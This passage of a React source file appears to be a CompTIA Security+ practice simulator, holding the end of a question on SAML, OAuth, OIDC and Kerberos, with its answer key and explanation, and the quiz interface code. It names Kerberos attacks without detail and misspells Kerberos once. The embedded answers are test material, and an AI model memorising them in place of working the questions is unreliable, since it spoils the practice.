      { id: "a", left: "Employees need to log into cloud SaaS apps (Salesforce, Office 365) using their corporate Active Directory credentials — no separate passwords.", right: "SAML 2.0 (Federated SSO)" },
      { id: "b", left: "A mobile app needs permission to access a user's Google Calendar data without the user giving the app their Google password.", right: "OAuth 2.0 (Authorization delegation)" },
      { id: "c", left: "A web app needs to verify WHO the user is (authentication) after they sign in with their Google account.", right: "OpenID Connect (OIDC — authentication layer over OAuth)" },
      { id: "d", left: "All employees must be required to use company-managed devices, and access must be blocked from personal devices even with valid credentials.", right: "Device Certificate / MDM-based Conditional Access" },
      { id: "e", left: "A service account needs to authenticate to an API every 30 seconds — can't use username/password for this.", right: "Service Account with API Key or Client Certificate" },
    ],
    explanation: `IDENTITY FEDERATION PROTOCOLS:\n\nSAML 2.0 (Security Assertion Markup Language):\n• XML-based. Used for enterprise SSO.\n• Roles: Identity Provider (IdP) = your company AD. Service Provider (SP) = SaaS app.\n• Flow: User → SP → redirects to IdP → user authenticates → IdP sends signed SAML assertion → SP grants access\n• Use case: Employee SSO to SaaS apps\n\nOAuth 2.0:\n• Authorization framework — NOT authentication\n• Grants apps permission to access resources WITHOUT sharing credentials\n• Tokens: Access Token (what you can do) | Refresh Token (get new access tokens)\n• Use case: "Allow this app to post to my Twitter"\n\nOpenID Connect (OIDC):\n• Authentication layer built ON TOP of OAuth 2.0\n• Adds: ID Token (who you are) + UserInfo endpoint\n• Use case: "Sign in with Google/Facebook" — authenticate + get user info\n• Key difference from OAuth: OAuth = authorization only, OIDC = authentication + authorization\n\nKERP TERBEROS (Active Directory):\n• Authentication protocol used within Windows domains\n• Tickets: TGT (Ticket Granting Ticket) + Service Tickets\n• Single Sign-On within the domain\n• Vulnerable to: Pass-the-ticket, Kerberoasting, Golden Ticket attacks\n\nSSOvs MFA: SSO reduces password fatigue. MFA adds security layers. Best practice: both.\n\nMEMORY TRICKS:\n• SAML = enterprise, XML, IdP/SP, SaaS SSO\n• OAuth = authorization (permission), not authentication (who you are)\n• OIDC = OAuth + "who are you?" (adds identity)`,
  },
];

const DOMAIN_CFG = {
  "Domain 1": { accent: "#38bdf8", bg: "#0c1e2e", tag: "#0d2540", label: "D1" },
  "Domain 2": { accent: "#f87171", bg: "#1e0c0c", tag: "#2d0f0f", label: "D2" },
  "Domain 3": { accent: "#4ade80", bg: "#0c1e0c", tag: "#0f2d0f", label: "D3" },
  "Domain 4": { accent: "#fbbf24", bg: "#1e1600", tag: "#2d2000", label: "D4" },
  "Domain 5": { accent: "#a78bfa", bg: "#170c2e", tag: "#220f40", label: "D5" },
};

const DIFF_COLOR = { Easy: "#4ade80", Medium: "#fbbf24", Hard: "#f87171" };

function ApproachGuide({ type, colors }) {
  const [open, setOpen] = useState(false);
  const guide = APPROACH_GUIDES[type];
  if (!guide) return null;
  return (
    <div style={{ marginBottom: 18 }}>
      <button onClick={() => setOpen(o => !o)} style={{ display: "flex", alignItems: "center", gap: 8, padding: "7px 14px", borderRadius: 7, border: `1px solid ${colors.accent}40`, background: open ? colors.accent + "12" : "#0a0a0a", color: colors.accent, cursor: "pointer", fontSize: 11, fontFamily: "monospace", letterSpacing: 1 }}>
        {open ? "▼" : "▶"} HOW TO APPROACH THIS QUESTION TYPE
      </button>
      {open && (
        <div style={{ marginTop: 8, padding: 18, borderRadius: 8, border: `1px solid ${colors.accent}20`, background: "#090909" }}>
          <div style={{ color: colors.accent, fontWeight: 700, fontSize: 12, marginBottom: 12, fontFamily: "monospace", letterSpacing: 1 }}>{guide.title}</div>
          <div style={{ display: "flex", flexDirection: "column", gap: 7, marginBottom: 14 }}>
            {guide.steps.map((s, i) => (
              <div key={i} style={{ fontSize: 12.5, color: "#c0c0c0", lineHeight: 1.7, padding: "6px 10px", borderRadius: 5, background: "#111", borderLeft: `2px solid ${colors.accent}50` }}>{s}</div>
            ))}
          </div>
          <div style={{ borderTop: "1px solid #1a1a1a", paddingTop: 10 }}>
            <div style={{ fontSize: 10, color: "#444", letterSpacing: 1, marginBottom: 7, fontFamily: "monospace" }}>KEY FRAMEWORKS & FORMULAS</div>
            {guide.frameworks.map((f, i) => (
              <div key={i} style={{ fontSize: 11.5, color: "#777", lineHeight: 1.7, fontFamily: "monospace" }}>→ {f}</div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function OrderingQ({ q, colors, onScore }) {
  const [order, setOrder] = useState(() => [...q.items].sort(() => Math.random() - 0.5));
  const [dragIdx, setDragIdx] = useState(null);
  const [done, setDone] = useState(false);
  const drop = (i) => { if (dragIdx === null || dragIdx === i) return; const o = [...order]; const [m] = o.splice(dragIdx, 1); o.splice(i, 0, m); setOrder(o); setDragIdx(null); };
  const submit = () => { const pts = order.filter((o, i) => o.id === q.correctOrder[i]).length; setDone(true); onScore(pts, q.items.length); };
  return (
    <div>
      <p style={{ color: "#777", fontSize: 12.5, marginBottom: 14 }}>Drag items to arrange in correct sequence ↕</p>
      <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
        {order.map((item, i) => {
          const ok = done && item.id === q.correctOrder[i], bad = done && item.id !== q.correctOrder[i];
          return (
            <div key={item.id} draggable={!done} onDragStart={() => setDragIdx(i)} onDragOver={e => e.preventDefault()} onDrop={() => drop(i)}
              style={{ padding: "10px 13px", borderRadius: 6, border: `1px solid ${ok ? "#4ade80" : bad ? "#f87171" : "#222"}`, background: ok ? "#0a200f" : bad ? "#200a0a" : "#121212", cursor: done ? "default" : "grab", display: "flex", alignItems: "center", gap: 9, userSelect: "none" }}>
              <span style={{ color: colors.accent, fontFamily: "monospace", fontWeight: 700, minWidth: 20, fontSize: 12 }}>{i + 1}.</span>
              <span style={{ color: "#d0d0d0", fontSize: 13, flex: 1, lineHeight: 1.5 }}>{item.text}</span>
              {ok && <span style={{ color: "#4ade80", fontSize: 14 }}>✓</span>}
              {bad && <span style={{ color: "#f87171", fontSize: 14 }}>✗</span>}
            </div>
          );
        })}
      </div>
      {done && (
        <div style={{ marginTop: 12, padding: 12, borderRadius: 7, background: "#0c0c0c", border: "1px solid #1a1a1a" }}>
          <div style={{ fontSize: 10, color: "#444", fontFamily: "monospace", marginBottom: 6 }}>CORRECT ORDER:</div>
          {q.correctOrder.map((id, i) => <div key={id} style={{ fontSize: 11.5, color: "#888", padding: "1px 0", fontFamily: "monospace" }}><span style={{ color: colors.accent }}>{i + 1}.</span> {q.items.find(x => x.id === id)?.text}</div>)}
        </div>
      )}
      {!done && <button onClick={submit} style={{ marginTop: 16, padding: "8px 22px", borderRadius: 6, border: "none", background: colors.accent, color: "#000", fontWeight: 700, cursor: "pointer", fontSize: 12, fontFamily: "monospace", letterSpacing: 1 }}>SUBMIT ORDER</button>}
    </div>
  );
}

function MatchingQ({ q, colors, onScore }) {
  const [sel, setSel] = useState({});
  const [done, setDone] = useState(false);
  const opts = q.pairs.map(p => p.right);
  const ok = Object.keys(sel).length === q.pairs.length;
  const submit = () => { const pts = q.pairs.filter(p => sel[p.id] === p.right).length; setDone(true); onScore(pts, q.pairs.length); };
  return (
    <div>
      <p style={{ color: "#777", fontSize: 12.5, marginBottom: 14 }}>Match each scenario to the correct answer:</p>
      <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
        {q.pairs.map(pair => {
          const isOk = done && sel[pair.id] === pair.right, isBad = done && sel[pair.id] !== pair.right;
          return (
            <div key={pair.id} style={{ padding: 13, borderRadius: 7, border: `1px solid ${isOk ? "#4ade80" : isBad ? "#f87171" : "#1e1e1e"}`, background: isOk ? "#0a200f" : isBad ? "#200a0a" : "#111" }}>
              <p style={{ color: "#ccc", fontSize: 12.5, margin: "0 0 9px 0", lineHeight: 1.7 }}>{pair.left}</p>
              <select value={sel[pair.id] || ""} onChange={e => !done && setSel(s => ({ ...s, [pair.id]: e.target.value }))} disabled={done}
                style={{ width: "100%", padding: "6px 9px", borderRadius: 5, border: `1px solid ${colors.accent}30`, background: "#0a0a0a", color: "#e0e0e0", fontSize: 12.5, cursor: done ? "default" : "pointer" }}>
                <option value="">— Select answer —</option>
                {opts.map(o => <option key={o} value={o}>{o}</option>)}
              </select>
              {done && <p style={{ margin: "7px 0 0 0", fontSize: 11.5, color: isOk ? "#4ade80" : "#f87171", fontFamily: "monospace" }}>{isOk ? "✓ Correct" : `✗ → ${pair.right}`}</p>}
            </div>
          );
        })}
      </div>
      {!done && <button onClick={submit} disabled={!ok} style={{ marginTop: 16, padding: "8px 22px", borderRadius: 6, border: "none", background: ok ? colors.accent : "#1e1e1e", color: ok ? "#000" : "#444", fontWeight: 700, cursor: ok ? "pointer" : "not-allowed", fontSize: 12, fontFamily: "monospace" }}>SUBMIT ({Object.keys(sel).length}/{q.pairs.length})</button>}
    </div>
  );
}

function HotspotQ({ q, colors, onScore }) {
  const [ans, setAns] = useState({});
  const [done, setDone] = useState(false);
  const ok = Object.keys(ans).length === q.hotspots.length;
  const submit = () => { const pts = q.hotspots.filter(h => ans[h.id] === h.correct).length; setDone(true); onScore(pts, q.hotspots.length); };
  return (
    <div>
      <p style={{ color: "#777", fontSize: 12.5, marginBottom: 14 }}>Select the correct classification for each item:</p>
      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
        {q.hotspots.map(h => {
          const isOk = done && ans[h.id] === h.correct, isBad = done && ans[h.id] !== h.correct;
          return (
            <div key={h.id} style={{ padding: 12, borderRadius: 7, border: `1px solid ${isOk ? "#4ade80" : isBad ? "#f87171" : "#1e1e1e"}`, background: isOk ? "#0a200f" : isBad ? "#200a0a" : "#111" }}>
              <div style={{ display: "flex", gap: 10, alignItems: "flex-start", flexWrap: "wrap" }}>
                <span style={{ color: "#ccc", fontSize: 12.5, flex: 1, minWidth: 180, lineHeight: 1.6, fontFamily: "monospace" }}>{h.label}</span>
                <select value={ans[h.id] || ""} onChange={e => !done && setAns(a => ({ ...a, [h.id]: e.target.value }))} disabled={done}
                  style={{ padding: "5px 9px", borderRadius: 5, border: `1px solid ${colors.accent}30`, background: "#0a0a0a", color: "#e0e0e0", fontSize: 12 }}>
                  <option value="">— Select —</option>
                  {h.options.map(o => <option key={o} value={o}>{o}</option>)}
                </select>
              </div>
              {done && <p style={{ margin: "7px 0 0 0", fontSize: 11.5, color: isOk ? "#4ade80" : "#f87171", lineHeight: 1.6 }}>{isOk ? "✓ " : `✗ → ${h.correct}: `}{h.reason}</p>}
            </div>
          );
        })}
      </div>
      {!done && <button onClick={submit} disabled={!ok} style={{ marginTop: 16, padding: "8px 22px", borderRadius: 6, border: "none", background: ok ? colors.accent : "#1e1e1e", color: ok ? "#000" : "#444", fontWeight: 700, cursor: ok ? "pointer" : "not-allowed", fontSize: 12, fontFamily: "monospace" }}>SUBMIT ({Object.keys(ans).length}/{q.hotspots.length})</button>}
    </div>
  );
}

function CalcQ({ q, colors, onScore }) {
  const [ans, setAns] = useState({});
  const [done, setDone] = useState(false);
  const ok = Object.keys(ans).length === q.questions.length;
  const submit = () => { const pts = q.questions.filter(x => ans[x.id] === x.correct).length; setDone(true); onScore(pts, q.questions.length); };
  return (
    <div>
      <div style={{ background: "#090909", border: `1px solid ${colors.accent}20`, borderRadius: 7, padding: 14, marginBottom: 18, fontFamily: "monospace" }}>
        <div style={{ color: colors.accent, fontSize: 10, letterSpacing: 2, marginBottom: 8 }}>GIVEN DATA</div>
        {[["Asset Value (AV)", "$2,000,000"], ["Exposure Factor (EF)", "25%"], ["Annual Rate of Occurrence (ARO)", "3 incidents/year"], ["Control Cost", "$100,000/year → reduces ARO to 0.5"]].map(([k, v]) => (
          <div key={k} style={{ display: "flex", justifyContent: "space-between", padding: "3px 0", borderBottom: "1px solid #131313", fontSize: 12 }}>
            <span style={{ color: "#666" }}>{k}</span>
            <span style={{ color: "#e0e0e0", fontWeight: 700 }}>{v}</span>
          </div>
        ))}
      </div>
      <div style={{ display: "flex", flexDirection: "column", gap: 13 }}>
        {q.questions.map(qx => {
          const isOk = done && ans[qx.id] === qx.correct, isBad = done && ans[qx.id] !== qx.correct;
          return (
            <div key={qx.id} style={{ padding: 13, borderRadius: 7, border: `1px solid ${isOk ? "#4ade80" : isBad ? "#f87171" : "#1e1e1e"}`, background: isOk ? "#0a200f" : isBad ? "#200a0a" : "#111" }}>
              <p style={{ color: "#ddd", fontSize: 13.5, margin: "0 0 4px 0", fontWeight: 600 }}>{qx.question}</p>
              <p style={{ color: colors.accent, fontSize: 11, margin: "0 0 11px 0", fontFamily: "monospace" }}>Formula: {qx.formula}</p>
              <div style={{ display: "flex", flexWrap: "wrap", gap: 7 }}>
                {qx.options.map(opt => (
                  <button key={opt} onClick={() => !done && setAns(a => ({ ...a, [qx.id]: opt }))} disabled={done}
                    style={{ padding: "6px 14px", borderRadius: 5, border: `1px solid ${ans[qx.id] === opt ? colors.accent : "#222"}`, background: ans[qx.id] === opt ? colors.accent + "20" : "#0c0c0c", color: ans[qx.id] === opt ? colors.accent : "#666", cursor: done ? "default" : "pointer", fontSize: 12.5, fontWeight: 700, fontFamily: "monospace" }}>
                    {opt}
                  </button>
                ))}
              </div>
              {done && <p style={{ margin: "9px 0 0 0", fontSize: 11.5, color: isOk ? "#4ade80" : "#f87171", fontFamily: "monospace" }}>{isOk ? `✓ ${qx.work}` : `✗ Answer: ${qx.correct} — ${qx.work}`}</p>}
            </div>
          );
        })}
      </div>
      {!done && <button onClick={submit} disabled={!ok} style={{ marginTop: 16, padding: "8px 22px", borderRadius: 6, border: "none", background: ok ? colors.accent : "#1e1e1e", color: ok ? "#000" : "#444", fontWeight: 700, cursor: ok ? "pointer" : "not-allowed", fontSize: 12, fontFamily: "monospace" }}>CALCULATE</button>}
    </div>
  );
}

function MultiSelectQ({ q, colors, onScore }) {
  const [sel, setSel] = useState(new Set());
  const [done, setDone] = useState(false);
  const correctIds = q.items.filter(i => i.correct).map(i => i.id);
  const toggle = id => { if (done) return; setSel(s => { const n = new Set(s); n.has(id) ? n.delete(id) : n.add(id); return n; }); };
  const submit = () => { const tp = [...sel].filter(id => correctIds.includes(id)).length; const fp = [...sel].filter(id => !correctIds.includes(id)).length; setDone(true); onScore(Math.max(0, tp - fp), correctIds.length); };
  return (
    <div>
      <p style={{ color: "#777", fontSize: 12.5, marginBottom: 14 }}>Select ALL options that apply. Incorrect selections reduce your score:</p>
      <div style={{ display: "flex", flexDirection: "column", gap: 7 }}>
        {q.items.map(item => {
          const selected = sel.has(item.id);
          const ok = done && item.correct && selected;
          const missed = done && item.correct && !selected;
          const wrong = done && !item.correct && selected;
          return (
            <div key={item.id} onClick={() => toggle(item.id)}
              style={{ padding: "10px 13px", borderRadius: 7, border: `1px solid ${ok ? "#4ade80" : missed ? "#fbbf24" : wrong ? "#f87171" : selected ? colors.accent : "#1e1e1e"}`, background: ok ? "#0a200f" : missed ? "#1a1400" : wrong ? "#200a0a" : selected ? colors.accent + "0e" : "#111", cursor: done ? "default" : "pointer", display: "flex", alignItems: "flex-start", gap: 10 }}>
              <div style={{ width: 17, height: 17, borderRadius: 4, border: `2px solid ${selected ? colors.accent : "#2a2a2a"}`, background: selected ? colors.accent : "transparent", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, marginTop: 2, fontSize: 10, color: "#000", fontWeight: 900 }}>{selected ? "✓" : ""}</div>
              <div style={{ flex: 1 }}>
                <span style={{ color: "#d0d0d0", fontSize: 13, lineHeight: 1.6 }}>{item.text}</span>
                {done && <p style={{ margin: "5px 0 0 0", fontSize: 11.5, color: ok ? "#4ade80" : missed ? "#fbbf24" : wrong ? "#f87171" : "#555", lineHeight: 1.6 }}>{ok ? "✓ " : missed ? "⚠ Missed — " : wrong ? "✗ Incorrect — " : ""}{item.reason}</p>}
              </div>
            </div>
          );
        })}
      </div>
      {!done && (
        <div style={{ marginTop: 16, display: "flex", alignItems: "center", gap: 14 }}>
          <button onClick={submit} style={{ padding: "8px 22px", borderRadius: 6, border: "none", background: colors.accent, color: "#000", fontWeight: 700, cursor: "pointer", fontSize: 12, fontFamily: "monospace" }}>SUBMIT ({sel.size} selected)</button>
          <span style={{ fontSize: 11, color: "#333", fontFamily: "monospace" }}>{correctIds.length} correct answers exist</span>
        </div>
      )}
    </div>
  );
}

export default function App() {
  const [idx, setIdx] = useState(0);
  const [scores, setScores] = useState({});
  const [showExp, setShowExp] = useState({});
  const [completed, setCompleted] = useState(new Set());
  const [filterDomain, setFilterDomain] = useState("All");
  const [filterDiff, setFilterDiff] = useState("All");

  const filtered = PBQ_BANK.filter(q =>
    (filterDomain === "All" || q.domain === filterDomain) &&
    (filterDiff === "All" || q.difficulty === filterDiff)
  );

  const q = filtered[Math.min(idx, filtered.length - 1)] || PBQ_BANK[0];
  const colors = DOMAIN_CFG[q.domain];

  const handleScore = useCallback((pts, total) => {
    setScores(s => ({ ...s, [q.id]: { pts, total } }));
    setCompleted(c => new Set([...c, q.id]));
  }, [q.id]);

  const totalPts = Object.values(scores).reduce((a, b) => a + b.pts, 0);
  const totalPoss = Object.values(scores).reduce((a, b) => a + b.total, 0);
  const pct = totalPoss > 0 ? Math.round((totalPts / totalPoss) * 100) : 0;
  const scoreColor = pct >= 80 ? "#4ade80" : pct >= 60 ? "#fbbf24" : pct > 0 ? "#f87171" : "#444";

  return (
    <div style={{ minHeight: "100vh", background: "#080808", fontFamily: "'Courier New', Courier, monospace", color: "#e0e0e0" }}>
      {/* TOP BAR */}
      <div style={{ background: "#0c0c0c", borderBottom: "1px solid #181818", padding: "12px 22px", display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, zIndex: 100 }}>
        <div>
          <div style={{ fontSize: 9, color: "#3a3a3a", letterSpacing: 3, marginBottom: 2 }}>COMPTIA SECURITY+ SY0-701 · PERFORMANCE BASED QUESTIONS</div>
          <div style={{ fontSize: 15, fontWeight: 700, letterSpacing: 1, color: "#e8e8e8" }}>PBQ PRACTICE SIMULATOR</div>
        </div>
        <div style={{ display: "flex", gap: 16, alignItems: "center" }}>
          <div>
            <div style={{ fontSize: 9, color: "#3a3a3a", letterSpacing: 1 }}>SCORE</div>
            <div style={{ fontSize: 17, fontWeight: 700, color: scoreColor, fontFamily: "monospace" }}>{totalPts}/{totalPoss} <span style={{ fontSize: 11 }}>({pct}%)</span></div>
          </div>
          <div style={{ width: 1, height: 28, background: "#1a1a1a" }} />
          <div>
            <div style={{ fontSize: 9, color: "#3a3a3a", letterSpacing: 1 }}>DONE</div>
            <div style={{ fontSize: 17, fontWeight: 700, color: "#555" }}>{completed.size}<span style={{ fontSize: 11 }}>/{PBQ_BANK.length}</span></div>
          </div>
        </div>
      </div>

      {/* FILTERS */}
      <div style={{ background: "#090909", borderBottom: "1px solid #131313", padding: "9px 22px", display: "flex", gap: 8, alignItems: "center", flexWrap: "wrap" }}>
        <span style={{ fontSize: 10, color: "#333", letterSpacing: 1 }}>DOMAIN:</span>
        {["All", "Domain 1", "Domain 2", "Domain 3", "Domain 4", "Domain 5"].map(d => (
          <button key={d} onClick={() => { setFilterDomain(d); setIdx(0); }}
            style={{ padding: "3px 10px", borderRadius: 4, border: `1px solid ${filterDomain === d ? (DOMAIN_CFG[d]?.accent || "#777") : "#191919"}`, background: filterDomain === d ? (DOMAIN_CFG[d]?.tag || "#1a1a1a") : "transparent", color: filterDomain === d ? (DOMAIN_CFG[d]?.accent || "#ccc") : "#333", cursor: "pointer", fontSize: 10, fontFamily: "monospace" }}>{d === "All" ? "All" : DOMAIN_CFG[d]?.label + " " + d.replace("Domain ", "")}</button>
        ))}
        <span style={{ color: "#1e1e1e", margin: "0 4px" }}>|</span>
        <span style={{ fontSize: 10, color: "#333", letterSpacing: 1 }}>DIFFICULTY:</span>
        {["All", "Easy", "Medium", "Hard"].map(d => (
          <button key={d} onClick={() => { setFilterDiff(d); setIdx(0); }}
            style={{ padding: "3px 10px", borderRadius: 4, border: `1px solid ${filterDiff === d ? (DIFF_COLOR[d] || "#777") : "#191919"}`, background: filterDiff === d ? (DIFF_COLOR[d] || "#777") + "18" : "transparent", color: filterDiff === d ? (DIFF_COLOR[d] || "#ccc") : "#333", cursor: "pointer", fontSize: 10, fontFamily: "monospace" }}>{d}</button>
        ))}
        <span style={{ marginLeft: "auto", fontSize: 10, color: "#2a2a2a", fontFamily: "monospace" }}>{filtered.length} questions</span>
      </div>

      {/* QUESTION NAV PILLS */}
      <div style={{ padding: "10px 22px", display: "flex", gap: 5, overflowX: "auto", borderBottom: "1px solid #0f0f0f", alignItems: "center" }}>
        {filtered.map((pbq, i) => {
          const c = DOMAIN_CFG[pbq.domain];
          const d = completed.has(pbq.id);
          const s = scores[pbq.id];
          const p = s ? Math.round((s.pts / s.total) * 100) : null;
          return (
            <button key={pbq.id} onClick={() => setIdx(i)}
              style={{ padding: "4px 10px", borderRadius: 4, border: `1px solid ${i === idx ? c.accent : d ? c.accent + "35" : "#181818"}`, background: i === idx ? c.accent + "18" : d ? c.tag : "transparent", color: i === idx ? c.accent : d ? c.accent + "88" : "#2a2a2a", cursor: "pointer", fontSize: 10, fontFamily: "monospace", whiteSpace: "nowrap", flexShrink: 0 }}>
              {d ? "✓ " : ""}{c.label}#{pbq.id}{p !== null ? ` ${p}%` : ""}
            </button>
          );
        })}
      </div>

      {/* MAIN CONTENT */}
      <div style={{ maxWidth: 900, margin: "0 auto", padding: "28px 22px" }}>
        {filtered.length === 0 ? (
          <div style={{ textAlign: "center", padding: 80, color: "#2a2a2a", fontSize: 13 }}>No questions match the current filters.</div>
        ) : (
          <>
            {/* QUESTION HEADER */}
            <div style={{ marginBottom: 22 }}>
              <div style={{ display: "flex", gap: 7, marginBottom: 11, flexWrap: "wrap" }}>
                <span style={{ padding: "2px 9px", borderRadius: 3, background: colors.tag, border: `1px solid ${colors.accent}25`, color: colors.accent, fontSize: 9.5, letterSpacing: 1, fontFamily: "monospace" }}>{q.domain}: {q.domainName}</span>
                <span style={{ padding: "2px 9px", borderRadius: 3, background: DIFF_COLOR[q.difficulty] + "15", border: `1px solid ${DIFF_COLOR[q.difficulty]}30`, color: DIFF_COLOR[q.difficulty], fontSize: 9.5, letterSpacing: 1, fontFamily: "monospace" }}>{q.difficulty}</span>
                <span style={{ padding: "2px 9px", borderRadius: 3, background: "#111", border: "1px solid #1e1e1e", color: "#444", fontSize: 9.5, letterSpacing: 1, fontFamily: "monospace" }}>{q.type.replace(/-/g, " ").toUpperCase()}</span>
                {q.examTip && <span style={{ padding: "2px 9px", borderRadius: 3, background: "#0f1200", border: "1px solid #fbbf2425", color: "#fbbf24", fontSize: 9.5, fontFamily: "monospace" }}>⚡ {q.examTip}</span>}
              </div>
              <h2 style={{ margin: "0 0 14px 0", fontSize: 20, fontWeight: 700, letterSpacing: 0.5, color: "#f0f0f0" }}>{q.title}</h2>
              <div style={{ background: "#0c0c0c", borderLeft: `3px solid ${colors.accent}`, borderRadius: "0 7px 7px 0", padding: 15, fontSize: 12.5, color: "#b0b0b0", lineHeight: 1.85, whiteSpace: "pre-wrap" }}>{q.scenario}</div>
            </div>

            {/* APPROACH GUIDE */}
            <ApproachGuide type={q.type} colors={colors} />

            {/* QUESTION BODY */}
            <div style={{ background: "#0d0d0d", border: "1px solid #1a1a1a", borderRadius: 10, padding: 22, marginBottom: 16 }}>
              {q.type === "ordering" && <OrderingQ key={q.id} q={q} colors={colors} onScore={handleScore} />}
              {q.type === "drag-and-drop" && <OrderingQ key={q.id} q={q} colors={colors} onScore={handleScore} />}
              {q.type === "matching" && <MatchingQ key={q.id} q={q} colors={colors} onScore={handleScore} />}
              {q.type === "hotspot" && <HotspotQ key={q.id} q={q} colors={colors} onScore={handleScore} />}
              {q.type === "calculation" && <CalcQ key={q.id} q={q} colors={colors} onScore={handleScore} />}
              {q.type === "multiselect" && <MultiSelectQ key={q.id} q={q} colors={colors} onScore={handleScore} />}
            </div>

            {/* EXPLANATION */}
            {completed.has(q.id) && (
              <div>
                <button onClick={() => setShowExp(s => ({ ...s, [q.id]: !s[q.id] }))}
                  style={{ padding: "7px 16px", borderRadius: 6, border: `1px solid ${colors.accent}35`, background: showExp[q.id] ? colors.accent + "12" : "#0c0c0c", color: colors.accent, cursor: "pointer", fontSize: 10.5, fontFamily: "monospace", letterSpacing: 1, marginBottom: 10 }}>
                  {showExp[q.id] ? "▼ HIDE EXPLANATION" : "▶ SHOW FULL EXPLANATION & EXAM TIPS"}
                </button>
                {showExp[q.id] && (
                  <div style={{ padding: 20, borderRadius: 9, border: `1px solid ${colors.accent}20`, background: "#070707" }}>
                    <div style={{ color: colors.accent, fontSize: 10, fontFamily: "monospace", letterSpacing: 2, marginBottom: 10, fontWeight: 700 }}>◆ FULL EXPLANATION & EXAM CONTEXT</div>
                    <pre style={{ margin: 0, fontSize: 12, color: "#b8b8b8", lineHeight: 1.9, whiteSpace: "pre-wrap", fontFamily: "monospace" }}>{q.explanation}</pre>
                  </div>
                )}
              </div>
            )}

            {/* NAVIGATION */}
            <div style={{ display: "flex", justifyContent: "space-between", marginTop: 28, paddingTop: 18, borderTop: "1px solid #0f0f0f" }}>
              <button onClick={() => setIdx(i => Math.max(0, i - 1))} disabled={idx === 0}
                style={{ padding: "8px 20px", borderRadius: 6, border: "1px solid #1a1a1a", background: "#0c0c0c", color: idx === 0 ? "#222" : "#666", cursor: idx === 0 ? "not-allowed" : "pointer", fontSize: 11, fontFamily: "monospace" }}>
                ← PREV
              </button>
              <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <span style={{ fontSize: 10, color: "#2a2a2a", fontFamily: "monospace" }}>{idx + 1} / {filtered.length}</span>
                {scores[q.id] && <span style={{ fontSize: 10, fontFamily: "monospace", color: scores[q.id].pts / scores[q.id].total >= 0.7 ? "#4ade80" : "#f87171" }}>[{scores[q.id].pts}/{scores[q.id].total} pts]</span>}
              </div>
              <button onClick={() => setIdx(i => Math.min(filtered.length - 1, i + 1))} disabled={idx === filtered.length - 1}
                style={{ padding: "8px 20px", borderRadius: 6, border: `1px solid ${idx === filtered.length - 1 ? "#1a1a1a" : colors.accent + "40"}`, background: idx === filtered.length - 1 ? "#0c0c0c" : colors.accent + "12", color: idx === filtered.length - 1 ? "#222" : colors.accent, cursor: idx === filtered.length - 1 ? "not-allowed" : "pointer", fontSize: 11, fontFamily: "monospace", fontWeight: 700 }}>
                NEXT →
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}
